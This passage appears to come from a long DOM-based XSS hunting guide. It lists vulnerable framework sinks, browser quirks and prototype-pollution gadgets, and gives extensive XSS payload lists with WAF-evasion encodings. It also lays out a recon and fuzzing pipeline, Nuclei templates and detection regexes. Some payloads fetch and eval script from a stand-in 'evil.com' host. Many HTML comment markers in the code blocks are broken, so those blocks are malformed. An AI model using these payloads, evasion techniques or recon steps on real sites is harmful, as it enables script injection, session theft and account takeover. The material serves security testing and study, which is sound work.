<div>{{ userInput }}</div>

<!-- DANGEROUS: v-html directive -->
<div v-html="userInput"></div>

<!-- DANGEROUS: URL attributes -->
<a :href="userInput">link</a>

<!-- DANGEROUS: Dynamic component -->
<component :is="userInput"></component>

<!-- DANGEROUS: Template compilation from strings -->
Vue.compile(userInput);
```

### Angular (2+)

```typescript
// DANGEROUS: bypassSecurityTrustHtml
this.sanitizer.bypassSecurityTrustHtml(userInput);

// DANGEROUS: innerHTML binding
[innerHTML]="userInput"

// DANGEROUS: Template injection in JIT compilation
// If user input reaches template compilation
```

### jQuery

```javascript
// DANGEROUS: html() method
$('#content').html(userInput);

// DANGEROUS: append() with HTML string
$('#content').append('<div>' + userInput + '</div>');

// DANGEROUS: selector from user input
$(userInput);  // Creates HTML if starts with <

// DANGEROUS: attr() with user input
$('#link').attr('href', userInput);

// DANGEROUS: prop() with user input
$('#script').prop('src', userInput);
```

### Ember / Backbone / Knockout

Similar patterns: any framework that allows raw HTML insertion or evaluates expressions from user input is vulnerable.

---

## Browser Quirks

### Internet Explorer Legacy Behaviors

```html
<!-- IE: expression() in CSS -->
<div style="width: expression(alert(1))">XSS</div>

!-- IE: behavior: url() -->
<div style="behavior: url(#default#VML)">...</div>

!-- IE: mhtml: protocol -->
<link rel=stylesheet href="mhtml:http://evil.com/xss.css">

!-- IE: res: protocol -->
<script src="res://evil.com/xss.dll"></script>
```

### Safari / WebKit Quirks

```html
<!-- WebKit: XSLT processing -->
<?xml version="1.0"?>
<?xml-stylesheet type="text/xsl" href="javascript:alert(1)"?>

!-- Safari: AutoFill abuse -->
<!-- Forms with specific names can trigger password autofill, which may execute JS in certain contexts -->
```

### Firefox Quirks

```html
<!-- Firefox: XBL bindings -->
<button xmlns="http://www.mozilla.org/xbl" style="-moz-binding: url('javascript:alert(1)')">XSS</button>

!-- Firefox: data: URI in object -->
<object data="data:text/html,<script>alert(1)</script>">
```

### Chrome Quirks

```html
<!-- Chrome: javascript: in iframe srcdoc -->
<iframe srcdoc="<a href='javascript:alert(1)'>click</a>"></iframe>

!-- Chrome: Portal element (experimental) -->
<portal src="javascript:alert(1)"></portal>
```

### Cross-Browser Differences in innerHTML

- **Chrome/Firefox:** `<script>` inside `innerHTML` is parsed but NOT executed
- **Historical IE:** `<script>` inside `innerHTML` WAS executed
- **All browsers:** Event handlers (`onerror`, `onload`) execute regardless

---

## Gadget Chains

### What are Gadgets?

Gadgets are existing pieces of code (functions, libraries, framework behaviors) that can be chained together with attacker-controlled input to achieve unintended execution.

### Common Gadget Patterns

```javascript
// Gadget 1: JSON.parse + Object.assign
// If application does: Object.assign(config, JSON.parse(userInput))
// Attacker: {"__proto__": {"polluted": true}}

// Gadget 2: URL constructor
// If application does: new URL(userInput, base)
// Attacker: javascript:alert(1)  (if base is javascript:)

// Gadget 3: Template compilation
// If application compiles user input as template
// AngularJS/Vue/Ember template injection

// Gadget 4: localStorage retrieval
// If application does: eval(localStorage.getItem('x'))
// Attacker sets localStorage via XSS or prototype pollution

// Gadget 5: postMessage handler
// If application accepts messages and passes to sink
// Attacker sends malicious message from another window/iframe
```

### Framework Gadget Chains

```javascript
// jQuery Gadget: $.getScript with polluted src
// Object.prototype.src = 'https://evil.com/xss.js';
// $.getScript('/ legitimate') loads evil.com instead

// Lodash Gadget: _.template with polluted settings
// Object.prototype.escape = false;
// _.template(userInput)(data) renders raw HTML

// Angular Gadget: $sanitize bypass via pollution
// If $sanitize relies on object properties that can be polluted
```

---

## Real World Case Studies

### Case Study 1: jQuery Mobile Hash XSS

**Vulnerability:** jQuery Mobile's `$.mobile.changePage()` processed `location.hash` without sanitization, leading to XSS when hash contained HTML.

**Impact:** Universal XSS affecting any site using jQuery Mobile.

**Payload:** `https://example.com/page#<img src=x onerror=alert(1)>`

### Case Study 2: Google Closure Library DOM XSS

**Vulnerability:** `goog.dom.safe.setInnerHtml` had bypasses in certain versions where sanitized HTML could still execute via parser confusion.

### Case Study 3: Prototype Pollution to RCE in Electron Apps

**Chain:**
1. Prototype pollution via URL parameter
2. Pollute `shell.openExternal` configuration
3. Execute arbitrary commands via `child_process`

### Case Study 4: postMessage in OAuth Flows

**Vulnerability:** OAuth callback pages often use `postMessage` to communicate tokens to the parent window without proper origin validation.

**Exploitation:**
```javascript
// Attacker iframe sends:
window.parent.postMessage({token: 'fake', action: 'login'}, '*');
// Parent window accepts and acts on message
```

### Case Study 5: DOM Clobbering in Modern Frameworks

**Vulnerability:** Lit-based web components were found vulnerable to DOM clobbering where custom elements could be overridden by HTML IDs.

---

## Fuzzing Payloads

### Basic Fuzzing Payloads

```html
<!-- Standard vectors -->
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<iframe src="javascript:alert(1)">
<body onload=alert(1)>

!-- Polyglot payloads (work in multiple contexts) -->
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */alert(1) )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!><sVg/<sVg/oNloAd=alert(1)//>>

!-- Context-breaking polyglot -->
'">><marquee><img src=x onerror=alert(1)></marquee>
```

### Attribute Context Fuzzing

```html
<!-- Breaking out of double quotes -->
" onerror="alert(1)" x="

!-- Breaking out of single quotes -->
' onerror='alert(1)' x='

!-- Breaking out of backticks -->
` onerror=alert(1) x=`

!-- Without spaces -->
"onerror=alert(1) x="

!-- HTML entities -->
&quot; onerror=&quot;alert(1)&quot;
```

### JavaScript Context Fuzzing

```javascript
// Breaking out of string
';alert(1);'
';alert(1);//
${alert(1)}
"-alert(1)-"
'-alert(1)-'

// Template literal injection
`${alert(1)}`
${alert(1)}

// Comment injection
*/alert(1)/*
//</script><script>alert(1)//
```

### URL Context Fuzzing

```
javascript:alert(1)
javascript://%0aalert(1)
data:text/html,<script>alert(1)</script>
//evil.com
\evil.com
https://evil.com
javascript:alert(1)//http://example.com
```

### Tiny XSS Payloads

From [Tiny-XSS-Payloads](https://github.com/terjanq/Tiny-XSS-Payloads):

```html
<!-- 18 chars -->
<svg/onload=alert(1)>

!-- 20 chars -->
<img src=x onerror=alert(1)>

!-- 23 chars -->
<body onload=alert(1)>

!-- 16 chars (if already in script context) -->
alert(document.domain)

!-- 14 chars -->
alert(top.domain)

!-- 12 chars -->
alert(location)
```

### WAF Evasion Payloads

```html
<!-- Case randomization -->
<ScRiPt>alert(1)</ScRiPt>

!-- Double encoding -->
%253Cscript%253Ealert(1)%253C%252Fscript%253E

!-- Unicode normalization -->
＜script＞alert(1)＜/script＞

!-- Null bytes (legacy PHP) -->
%00<script>alert(1)</script>

!-- Tab/newline in tags -->
<img src=x onerror=alert(1)>

!-- Using eval with fromCharCode -->
<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>

!-- Using location -->
<script>location='javascript:alert(1)'</script>

!-- Using setTimeout -->
<script>setTimeout('alert(1)',0)</script>

!-- Using Function constructor -->
<script>Function('alert(1)')()</script>
```

---

## Automation Workflows

### Full Recon + DOM XSS Hunting Pipeline

```bash
# Step 1: Subdomain enumeration
subfinder -d target.com -all -o subs.txt

# Step 2: Probe for live hosts
httpx -l subs.txt -o live.txt

# Step 3: Crawl for endpoints (standard + headless)
katana -list live.txt -jc -jsl -headless -d 5 -o endpoints.txt

# Step 4: Extract URLs with parameters
cat endpoints.txt | grep '\?' | qsreplace -a > params.txt

# Step 5: Fuzz for DOM XSS sinks
cat params.txt | while read url; do
  # Test for innerHTML/document.write patterns
  echo "$url" | dalfox pipe --waf-evasion
  # Test for postMessage handlers
  # Test for prototype pollution
  echo "$url?__proto__[x]=1" | httpx -mr "x=1"
done

# Step 6: JavaScript analysis for sinks
katana -list live.txt -jc -jsl -headless | grep '\.js$' > js_files.txt
cat js_files.txt | while read js; do
  curl -s "$js" | grep -E '(innerHTML|document\.write|eval|setTimeout|location\.href|postMessage)'
done
```

### DOM Invader Workflow (Burp Suite)

1. Enable **DOM Invader** extension in Burp Suite
2. Navigate to target application
3. DOM Invader automatically:
   - Scans for DOM XSS sinks
   - Identifies sources flowing into sinks
   - Tests canary injection
   - Reports exploitable chains

### Headless Browser Fuzzing

```python
# Python + Playwright/Selenium for DOM XSS detection
from playwright.sync_api import sync_playwright
import sys

def test_dom_xss(url, payload):
    with sync_playwright() as p:
        browser = p.chromium.launch()
        page = browser.new_page()

        # Hook alert/confirm/prompt
        alerts = []
        page.on('dialog', lambda dialog: alerts.append(dialog.message) or dialog.accept())

        # Inject payload via URL parameter
        test_url = f"{url}?q={payload}"
        page.goto(test_url)

        # Also test hash
        page.goto(f"{url}#{payload}")

        if alerts:
            print(f"[XSS] {test_url} -> {alerts}")

        browser.close()

# Usage
payloads = ['<img src=x onerror=alert(1)>', '<svg onload=alert(1)>']
for p in payloads:
    test_dom_xss(sys.argv[1], p)
```

---

## Recon Methodology

### Phase 1: Asset Discovery

```bash
# Subdomain enumeration
subfinder -d target.com -all | dnsx -silent | httpx -title -tech-detect

# ASN / IP range discovery
echo target.com | dnsx -silent -a -resp | mapcidr -silent

# Port scanning (for non-standard web ports)
cat ips.txt | naabu -top-ports 1000
```

### Phase 2: Endpoint Discovery

```bash
# Crawl with JavaScript parsing
katana -u https://target.com -jc -jsl -headless -d 5

# Wayback / archive discovery
curl -s "http://web.archive.org/cdx/search/cdx?url=*.target.com/*&output=json&collapse=urlkey" | jq -r '.[1:][][2]' | sort -u

# JavaScript file extraction
cat endpoints.txt | grep '\.js$' > js_files.txt
```

### Phase 3: Parameter Discovery

```bash
# Extract parameters from URLs
cat endpoints.txt | grep '\?' | qsreplace -a | sort -u

# Common parameter fuzzing
ffuf -u "https://target.com/page?FUZZ=test" -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt

# Top 25 parameter list (from lutfumertceylan)
# test, redirect, url, return, next, r, u, go, target, dest, destination, redir, view, path, continue, returnTo, return_to, checkout_url, success_url, forward, redirect_url, redirect_uri, callback, oauth_callback, proxy, link, src, data, ref, site, html
```

### Phase 4: Sink Identification

```bash
# Grep for dangerous sinks in JS files
cat js_files.txt | while read f; do
  curl -s "$f" | grep -n -E '(innerHTML|outerHTML|document\.write|document\.writeln|eval\(|setTimeout\(|setInterval\(|Function\(|location\.href|location\.replace|location\.assign|window\.open|postMessage)'
done

# Look for source-to-sink patterns
grep -r "location\.hash.*innerHTML" .
grep -r "postMessage.*eval" .
grep -r "localStorage.*document\.write" .
```

### Phase 5: Context Analysis

1. Identify where user input enters the application (source)
2. Trace data flow through JavaScript
3. Identify if sanitization occurs
4. Identify the final sink
5. Determine if the sink is exploitable in that context

---

## Nuclei Templates

### Nuclei XSS Template Logic

Nuclei templates for XSS detection use **matcher conditions** on response bodies to detect successful injection:

```yaml
# Example nuclei template structure for DOM XSS
id: dom-xss-reflected

info:
  name: Reflected DOM XSS
  severity: high

requests:
  - method: GET
    path:
      - "{{BaseURL}}/?q=<img%20src=x%20onerror=alert(1)>"

    matchers:
      - type: word
        words:
          - "<img src=x onerror=alert(1)>"
        part: body
        condition: and

      - type: word
        words:
          - "text/html"
        part: header
```

### Key Nuclei XSS Templates

From [nuclei-templates](https://github.com/projectdiscovery/nuclei-templates/tree/main/http/vulnerabilities/xss):

| Template | Purpose |
|----------|---------|
| `reflected-xss.yaml` | Basic reflected XSS detection |
| `dom-xss.yaml` | DOM-specific XSS patterns |
| `xss-deprecated-header.yaml` | Header-based XSS |
| `csp-bypass.yaml` | CSP bypass detection |
| `prototype-pollution.yaml` | Prototype pollution detection |

### Running Nuclei for DOM XSS

```bash
# Scan with XSS templates
nuclei -u https://target.com -t http/vulnerabilities/xss/

# Scan with custom DOM XSS template
nuclei -u https://target.com -t dom-xss-template.yaml -headless

# Fuzzing mode
nuclei -u https://target.com -t fuzzing-templates/ -fuzz
```

### Custom Nuclei Template for postMessage

```yaml
id: postmessage-dom-xss

info:
  name: postMessage DOM XSS
  severity: high

headless:
  - steps:
      - args:
          url: "{{BaseURL}}"
        action: navigate

      - action: script
        args:
          code: |
            window.addEventListener('message', function(e) {
              document.body.innerHTML = e.data;
            });
            window.postMessage('<img src=x onerror=alert(1)>', '*');

    matchers:
      - type: alert
        count: 1
```

---

## Tools and Scanners

### Dynamic Analysis Tools

| Tool | Purpose | URL |
|------|---------|-----|
| **Dom Invader** | Burp Suite extension for DOM XSS | https://github.com/PortSwigger/dom-invader |
| **DalFox** | Modern XSS scanner | https://github.com/hahwul/dalfox |
| **XSSer** | Automated XSS tester | https://github.com/epsylon/xsser |
| **tracy** | Runtime XSS discovery | https://github.com/nccgroup/tracy |
| **DOM Dig** | DOM XSS fuzzer | https://github.com/y0k4i-1337/domdig |

### Prototype Pollution Tools

| Tool | Purpose | URL |
|------|---------|-----|
| **pp-finder** | Find prototype pollution gadgets | https://github.com/yeswehack/pp-finder |
| **pp-debugger** | Chrome extension for PP detection | https://github.com/GoogleChromeLabs/pp-debugger |
| **client-side-prototype-pollution** | Research repo | https://github.com/BlackFan/client-side-prototype-pollution |

### postMessage Tools

| Tool | Purpose | URL |
|------|---------|-----|
| **postMessage-tracker** | Monitor postMessage traffic | https://github.com/fransr/postMessage-tracker |
| **postMessage-fuzz** | Fuzz postMessage handlers | Various scripts |

### Recon/Crawling Tools

| Tool | Purpose | URL |
|------|---------|-----|
| **Katana** | Next-gen web crawler | https://github.com/projectdiscovery/katana |
| **httpx** | Fast HTTP prober | https://github.com/projectdiscovery/httpx |
| **subfinder** | Subdomain enumeration | https://github.com/projectdiscovery/subfinder |
| **cariddi** | Crawler + secret finder | https://github.com/edoardottt/cariddi |

### Network/Tunneling Tools

| Tool | Purpose | URL |
|------|---------|-----|
| **interactsh** | OOB interaction gathering | https://github.com/projectdiscovery/interactsh |
| **smuggler** | HTTP request smuggling | https://github.com/defparam/smuggler |
| **CursedChrome** | Chrome implant for XSS exploitation | https://github.com/mandatoryprogrammer/CursedChrome |

### Payload Collections

| Resource | Description | URL |
|----------|-------------|-----|
| **PayloadsAllTheThings** | Comprehensive payload list | https://github.com/swisskyrepo/PayloadsAllTheThings |
| **xss-payload-list** | XSS-specific payloads | https://github.com/payloadbox/xss-payload-list |
| **Tiny-XSS-Payloads** | Short XSS payloads | https://github.com/terjanq/Tiny-XSS-Payloads |
| **SecLists** | General security wordlists | https://github.com/danielmiessler/SecLists |

---

## Advanced Research

### PortSwigger Research Highlights

1. **DOM-based AngularJS Sandbox Escapes**
   - Demonstrated that AngularJS expression sandbox was never a security boundary
   - Showed how prototype chains and JavaScript internals could bypass restrictions
   - Led to sandbox removal in AngularJS 1.6

2. **DOM Clobbering Strikes Back**
   - Showed DOM clobbering is still relevant in modern browsers
   - Introduced nested clobbering techniques
   - Demonstrated clobbering in Shadow DOM and custom elements

3. **XSS Without HTML: Client-Side Template Injection**
   - Introduced CSTI (Client-Side Template Injection) as a distinct class
   - Showed AngularJS, Vue, and other frameworks vulnerable
   - Demonstrated bypasses of naive HTML sanitization

4. **Exploiting XSS in Hidden Inputs and Meta Tags**
   - Showed that `innerHTML` on hidden inputs or meta tags can still execute
   - Demonstrated `<meta>` tag-based XSS via `http-equiv`
   - Introduced parser confusion techniques

5. **Bypassing CSP with Policy Injection**
   - Showed how URL parameters reflected in CSP headers can weaken policy
   - Demonstrated nonce reuse and predictable nonce generation

6. **Hunting Nonce-Based CSP Bypasses**
   - Dynamic analysis approach to finding nonce leaks
   - Showed how DOM XSS can read nonces from the DOM

7. **Browser-Powered Desync Attacks**
   - Showed how client-side request smuggling can be achieved
   - Relevant for chaining with DOM XSS to bypass protections

### Client-Side Template Injection (CSTI)

CSTI occurs when an application embeds user input in a client-side template that is processed by the browser:

```javascript
// Vue.js CSTI
// Template: <div>{{ userInput }}</div>
// In Vue 2, if userInput is: {{constructor.constructor('alert(1)')()}}
// It executes because Vue compiles templates to JavaScript

// AngularJS CSTI
// <div ng-app>{{constructor.constructor('alert(1)')()}}</div>
```

### Research Methodology for Finding New Gadgets

1. **Identify popular libraries/frameworks** in target applications
2. **Analyze source code** for merge/extend/assign operations
3. **Test for `__proto__` pollution** via URL parameters
4. **Trace polluted properties** to DOM sinks
5. **Develop exploitation chains** combining multiple gadgets

---

## Bug Bounty Writeups

### Notable DOM XSS Bug Bounty Reports

| Researcher | Target | Technique | Bounty |
|------------|--------|-----------|--------|
| **filedescriptor** | Various | Modern browser exploitation | Multiple |
| **PortSwigger Research** | Frameworks | Sandbox escapes, CSTI | Research |
| **BlackFan** | Libraries | Prototype pollution chains | Multiple |
| **terjanq** | Various | Tiny payloads, WAF bypasses | Multiple |

### Key Takeaways from Writeups

1. **DOM XSS is often missed** by automated scanners because it requires JavaScript execution analysis
2. **Hash-based XSS** is extremely common in SPAs and often overlooked
3. **postMessage handlers** are frequently vulnerable due to missing origin checks
4. **Prototype pollution** is a powerful primitive that can upgrade DOM XSS to full account takeover
5. **Browser DevTools** (Sources panel, Event Listener Breakpoints) are essential for manual DOM XSS hunting

---

## Payload Collections

### Comprehensive DOM XSS Payload List

```html
<!-- ==================== HTML INJECTION ==================== -->

<!-- Image onerror -->
<img src=x onerror=alert(1)>
<img src=x onerror=alert`1`>
<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)>
<img src=//:0 onerror=alert(1)>

<!-- SVG onload -->
<svg onload=alert(1)>
<svg onload=alert`1`>
<svg/onload=alert(1)>

<!-- Iframe -->
<iframe src="javascript:alert(1)">
<iframe src="data:text/html,<script>alert(1)</script>">

<!-- Body onload -->
<body onload=alert(1)>

<!-- Input autofocus -->
<input onfocus=alert(1) autofocus>
<input onblur=alert(1) autofocus>

<!-- Video/Audio -->
<video><source onerror="alert(1)">
<audio src=x onerror=alert(1)>

!-- Details -->
<details open ontoggle=alert(1)>

!-- Select -->
<select onchange=alert(1)><option>1<option>2

!-- Marquee -->
<marquee onstart=alert(1)>
<marquee onbounce=alert(1)>

!-- Object/Embed -->
<object data="javascript:alert(1)">
<embed src="javascript:alert(1)">

!-- MathML (Firefox) -->
<math><mtext><table><mglyph><style><img src=x onerror=alert(1)></style></mglyph></table></mtext></math>

!-- Template -->
<template onload=alert(1)>

!-- ForeignObject -->
<svg><foreignObject><body xmlns="http://www.w3.org/1999/xhtml"><script>alert(1)</script></body></foreignObject></svg>

!-- Portal (Chrome experimental) -->
<portal src="javascript:alert(1)"></portal>

!-- Meta refresh -->
<meta http-equiv="refresh" content="0;url=javascript:alert(1)">

!-- Base tag -->
<base href="javascript:alert(1)//">

!-- Form -->
<form action="javascript:alert(1)"><button>Click</button></form>

!-- Isindex (legacy) -->
<isindex type=image src=1 onerror=alert(1)>

!-- Frame (legacy) -->
<frame src="javascript:alert(1)">

!-- Applet (legacy) -->
<applet code="javascript:alert(1)">

!-- Script via data URI -->
<script src="data:text/javascript,alert(1)"></script>

!-- Script via javascript scheme -->
<script src="javascript:alert(1)"></script>


<!-- ==================== JAVASCRIPT EXECUTION ==================== -->

<!-- Direct eval -->
<script>eval('alert(1)')</script>

!-- Function constructor -->
<script>Function('alert(1)')()</script>

!-- setTimeout/setInterval -->
<script>setTimeout('alert(1)',0)</script>
<script>setInterval('alert(1)',0)</script>

!-- Location assignment -->
<script>location='javascript:alert(1)'</script>
<script>location.href='javascript:alert(1)'</script>
<script>location.replace('javascript:alert(1)')</script>

!-- window.open -->
<script>window.open('javascript:alert(1)')</script>

!-- constructor -->
<script>constructor.constructor('alert(1)')()</script>

!-- throw + eval -->
<script>throw onerror=alert,1</script>

!-- import() -->
<script>import('data:text/javascript,alert(1)')</script>

!-- fetch + eval -->
<script>fetch('//evil.com/xss.js').then(r=>r.text()).then(eval)</script>


<!-- ==================== ANGULARJS ==================== -->

<!-- Basic sandbox escape (1.0-1.5) -->
{{constructor.constructor('alert(1)')()}}

!-- charAt join technique -->
{{a=toString().constructor.prototype;a.charAt=[].join;$eval('a=alert(1)');}}

!-- Modern AngularJS (no sandbox) -->
{{constructor.constructor('alert(1)')()}}
{{$eval.constructor('alert(1)')()}}
{{angular.element(document).injector().get('$compile')('<script>alert(1)</script>')(angular.element(document).scope())}}

!-- ng-bind with expression -->
<div ng-bind="{{constructor.constructor('alert(1)')()}}"></div>

!-- ng-app with ng-csp -->
<div ng-app ng-csp>{{constructor.constructor('alert(1)')()}}</div>


<!-- ==================== PROTOTYPE POLLUTION ==================== -->

<!-- URL-based -->
?__proto__[polluted]=true
?__proto__.polluted=true
?constructor[prototype][polluted]=true
?constructor.prototype.polluted=true

!-- Property pollution to DOM XSS -->
?__proto__[innerHTML]=<img/src=x onerror=alert(1)>
?__proto__[src]=x&__proto__[onerror]=alert(1)

!-- JSON-based -->
{"__proto__":{"polluted":true}}
{"constructor":{"prototype":{"polluted":true}}}


<!-- ==================== POSTMESSAGE ==================== -->

<!-- Basic exploitation (if no origin check) -->
<script>
  window.postMessage('<img src=x onerror=alert(1)>', '*');
</script>

!-- JSON-based -->
<script>
  window.postMessage('{"html":"<img src=x onerror=alert(1)>"}', '*');
</script>

!-- Null origin bypass -->
<iframe sandbox="allow-scripts" srcdoc="<script>window.parent.postMessage('xss','*')</script>"></iframe>


<!-- ==================== DOM CLOBBERING ==================== -->

<!-- Basic clobbering -->
<a id="config" href="javascript:alert(1)"></a>

!-- Form with inputs -->
<form id="config"><input name="src" value="javascript:alert(1)"></form>

!-- HTMLCollection -->
<a id="x">1</a><a id="x" href="javascript:alert(1)">2</a>

!-- Nested clobbering -->
<form id="a"><input name="b" value="javascript:alert(1)"></form>


<!-- ==================== TEMPLATE INJECTION ==================== -->

<!-- Vue.js -->
{{constructor.constructor('alert(1)')()}}
<div v-html="userInput"></div>

!-- Handlebars/Mustache -->
{{#with "constructor"}}{{constructor.constructor "alert(1)"}}{{/with}}

!-- Ember -->
{{constructor.constructor 'alert(1)' ()}}
```

---

## WAF Bypasses

### Technique 1: Encoding Obfuscation

```html
<!-- HTML entities -->
<img src=x onerror="&#97;&#108;&#101;&#114;&#116;(1)">

!-- Hex entities -->
<img src=x onerror="&#x61;&#x6c;&#x65;&#x72;&#x74;(1)">

!-- URL encoding -->
%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E

!-- Double URL encoding -->
%253Cimg%2520src%253Dx%2520onerror%253Dalert(1)%253E

!-- Unicode -->
＜img src=x onerror=alert(1)＞
```

### Technique 2: Case and Whitespace Variation

```html
<!-- Mixed case -->
<ImG SrC=x OnErRoR=alert(1)>

!-- No quotes -->
<img src=x onerror=alert(1)>

!-- Tab separation -->
<img	src=x	onerror=alert(1)>

!-- Newline in tag -->
<img
src=x
onerror=alert(1)>
```

### Technique 3: Protocol and Scheme Abuse

```html
<!-- javascript: variants -->
javascript:alert(1)
javascript://%0aalert(1)
javascript:/*--></script></title></style>"/</textarea></xmp><svg/onload='+/"/+/onmouseover=1/+/[*/[]/+alert(1)//'>

!-- data: variants -->
data:text/html,<script>alert(1)</script>
data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==

!-- vbscript: (IE legacy) -->
vbscript:msgbox(1)
```

### Technique 4: Event Handler Alternatives

```html
<!-- Standard -->
onerror=alert(1)

!-- HTML5 events -->
onload=alert(1)
onclick=alert(1)
onmouseover=alert(1)
onfocus=alert(1)
onblur=alert(1)
onchange=alert(1)
onsubmit=alert(1)
onreset=alert(1)
onselect=alert(1)
onabort=alert(1)
ondrag=alert(1)
ondrop=alert(1)
```

### Technique 5: Parenthesesless Execution

```javascript
<!-- Using backticks -->
alert`1`

!-- Using throw -->
throw onerror=alert,1

!-- Using with -->
with(document)alert(1)

!-- Using eval and location -->
eval(location.hash.slice(1))
```

---

## Detection Techniques

### Manual Detection Workflow

1. **Identify Sources:** Look for URL parameters, hash fragments, postMessage handlers, storage reads
2. **Trace Data Flow:** Use browser DevTools (Sources panel, breakpoints) to trace from source to sink
3. **Identify Sinks:** Look for `innerHTML`, `document.write`, `eval`, `setTimeout`, `location.href`, etc.
4. **Test Injection:** Inject canary strings (e.g., `xss_test_1234`) and search for them in DOM/scripts
5. **Verify Execution:** Replace canary with actual payload and confirm execution

### Using Browser DevTools

```javascript
// Hook common sinks in DevTools console
(function() {
    const original = {
        innerHTML: Object.getOwnPropertyDescriptor(Element.prototype, 'innerHTML'),
        write: document.write,
        eval: window.eval,
        setTimeout: window.setTimeout,
        setInterval: window.setInterval
    };

    Object.defineProperty(Element.prototype, 'innerHTML', {
        set: function(value) {
            if (value.includes('xss')) console.trace('innerHTML set:', value);
            return original.innerHTML.set.call(this, value);
        }
    });

    document.write = function(...args) {
        console.trace('document.write:', args);
        return original.write.apply(this, args);
    };

    window.eval = function(code) {
        console.trace('eval called:', code);
        return original.eval.call(this, code);
    };
})();
```

### Automated Detection with Headless Browsers

```javascript
// Playwright/Puppeteer detection script
const { chromium } = require('playwright');

async function detectDomXss(url) {
    const browser = await chromium.launch();
    const page = await browser.newPage();

    let xssDetected = false;

    page.on('dialog', async dialog => {
        console.log(`[XSS DETECTED] ${url} -> Dialog: ${dialog.message()}`);
        xssDetected = true;
        await dialog.accept();
    });

    // Inject payload via all common sources
    const payloads = [
        '?q=<img src=x onerror=alert(1)>',
        '?search=<svg onload=alert(1)>',
        '#<img src=x onerror=alert(1)>',
        '?redirect=javascript:alert(1)'
    ];

    for (const payload of payloads) {
        await page.goto(url + payload, { waitUntil: 'networkidle' });
        await page.waitForTimeout(2000);
    }

    await browser.close();
    return xssDetected;
}
```

### DOM Invader Detection

Dom Invader (Burp Suite extension) provides:
- **Automatic sink identification**
- **Source-to-sink tracing**
- **Canary injection and detection**
- **Exploit generation**

### Static Analysis Patterns

```regex
# Regex patterns for finding sinks in JavaScript
innerHTML\s*=.*\+
outerHTML\s*=.*\+
document\.write\s*\(.*\+
document\.writeln\s*\(.*\+
eval\s*\(.*\+
setTimeout\s*\(\s*["'].*\+
setInterval\s*\(\s*["'].*\+
Function\s*\(\s*["'].*\+
location\.href\s*=.*\+
location\.replace\s*\(.*\+
window\.open\s*\(.*\+
postMessage\s*\(.*,\s*["']\*["']
```

---

## References

### Primary Sources

1. **PortSwigger Web Security Academy**
   - DOM-based XSS: https://portswigger.net/web-security/cross-site-scripting/dom-based
   - DOM-based vulnerabilities: https://portswigger.net/web-security/dom-based
   - Labs: document.write sink, innerHTML sink, jQuery hash-change, AngularJS expression

2. **PortSwigger Research**
   - DOM-based AngularJS Sandbox Escapes: https://portswigger.net/research/dom-based-angularjs-sandbox-escapes
   - DOM Clobbering Strikes Back: https://portswigger.net/research/dom-clobbering-strikes-back
   - XSS Without HTML (CSTI): https://portswigger.net/research/xss-without-html-client-side-template-injection-with-angularjs
   - Exploiting XSS in Hidden Inputs and Meta Tags: https://portswigger.net/research/exploiting-xss-in-hidden-inputs-and-meta-tags
   - Bypassing CSP with Policy Injection: https://portswigger.net/research/bypassing-csp-with-policy-injection
   - Hunting Nonce-Based CSP Bypasses: https://portswigger.net/research/hunting-nonce-based-csp-bypasses-with-dynamic-analysis
   - Hidden OAuth Attack Vectors: https://portswigger.net/research/hidden-oauth-attack-vectors
   - Browser-Powered Desync Attacks: https://portswigger.net/research/browser-powered-desync-attacks

3. **MDN Web Docs**
   - Element.innerHTML: https://developer.mozilla.org/en-US/docs/Web/API/Element/innerHTML
   - Document.write: https://developer.mozilla.org/en-US/docs/Web/API/Document/write
   - Window.location: https://developer.mozilla.org/en-US/docs/Web/API/Window/location
   - Window.postMessage: https://developer.mozilla.org/en-US/docs/Web/API/Window/postMessage
   - URLSearchParams: https://developer.mozilla.org/en-US/docs/Web/API/URLSearchParams
   - Location.hash: https://developer.mozilla.org/en-US/docs/Web/API/Location/hash
   - Document.cookie: https://developer.mozilla.org/en-US/docs/Web/API/Document/cookie
   - Window.localStorage: https://developer.mozilla.org/en-US/docs/Web/API/Window/localStorage
   - Window.sessionStorage: https://developer.mozilla.org/en-US/docs/Web/API/Window/sessionStorage

4. **HackTricks**
   - DOM XSS Guide: https://book.hacktricks.wiki/en/pentesting-web/xss-cross-site-scripting/dom-xss.html

5. **PayloadsAllTheThings**
   - DOM XSS Payloads: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/DOM%20based%20XSS

### Tools and Frameworks

- **Dom Invader:** https://github.com/PortSwigger/dom-invader
- **pp-finder:** https://github.com/yeswehack/pp-finder
- **pp-debugger:** https://github.com/GoogleChromeLabs/pp-debugger
- **postMessage-tracker:** https://github.com/fransr/postMessage-tracker
- **client-side-prototype-pollution:** https://github.com/BlackFan/client-side-prototype-pollution
- **Tiny-XSS-Payloads:** https://github.com/terjanq/Tiny-XSS-Payloads
- **xss-payload-list:** https://github.com/payloadbox/xss-payload-list

### ProjectDiscovery Ecosystem

- **nuclei:** https://github.com/projectdiscovery/nuclei
- **nuclei-templates (XSS):** https://github.com/projectdiscovery/nuclei-templates/tree/main/http/vulnerabilities/xss
- **katana:** https://github.com/projectdiscovery/katana
- **httpx:** https://github.com/projectdiscovery/httpx
- **subfinder:** https://github.com/projectdiscovery/subfinder
- **interactsh:** https://github.com/projectdiscovery/interactsh
- **dnsx:** https://github.com/projectdiscovery/dnsx
- **naabu:** https://github.com/projectdiscovery/naabu
- **mapcidr:** https://github.com/projectdiscovery/mapcidr

### Additional Resources

- **cariddi:** https://github.com/edoardottt/cariddi
- **smuggler:** https://github.com/defparam/smuggler
- **CursedChrome:** https://github.com/mandatoryprogrammer/CursedChrome
- **top25-parameter:** https://github.com/lutfumertceylan/top25-parameter
- **SecLists:** https://github.com/danielmiessler/SecLists
- **template-injection-workshop:** https://github.com/PortSwigger/template-injection-workshop

### Research Papers and Articles

- **"DOM XSS Exploitation Guide"** — Infosec Writeups
- **"DOM XSS Bypasses and Modern Browser Exploitation"** — @filedescriptor
- **"Client-Side Prototype Pollution"** — BlackFan
- **"XSS Without HTML: Client-Side Template Injection"** — PortSwigger
